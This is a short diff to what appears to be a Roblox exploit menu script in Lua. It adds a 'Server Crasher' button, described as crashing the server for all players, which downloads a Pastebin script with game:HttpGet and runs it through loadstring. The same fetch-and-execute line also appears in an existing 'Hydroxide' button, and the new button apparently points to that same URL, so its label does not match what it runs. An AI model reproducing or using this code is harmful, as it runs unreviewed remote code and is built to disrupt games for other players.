@@ -38,6 +38,10 @@ end)
 MainSection:NewButton("Hydroxide", "Like RemoteSpy" , function()
 	loadstring(game:HttpGet("https://pastebin.com/raw/SqfkEjyj"))()
 end)
+
+MainSection:NewButton("Server Crasher", "Completely crashes the server (crashes you and all players)" , function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/SqfkEjyj"))()
+end)
  
 local Player = Window:NewTab("Player")
 local PlayerSection = Player:NewSection("Player")
